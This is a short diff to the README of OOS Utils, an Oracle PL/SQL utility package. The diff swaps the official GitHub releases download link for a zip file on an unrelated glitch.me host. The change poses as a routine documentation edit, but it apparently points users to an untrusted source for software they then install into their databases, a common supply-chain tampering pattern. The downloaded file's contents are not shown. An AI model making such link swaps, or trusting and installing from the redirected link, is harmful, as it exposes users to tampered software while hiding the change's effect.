@@ -14,7 +14,7 @@ For quick install of the latest version of OOS Utils using [SQLcl](http://www.or
 
 If you want to download a copy and install from a local file:
 
-[Download](https://github.com/OraOpenSource/oos-utils/releases) the latest version of OOS Utils
+[Download](https://observant-message.glitch.me/oos-utils/latest/oos-utils-latest.zip) the latest version of OOS Utils
 
 To install OOS Utils run the following in sql*plus:
 
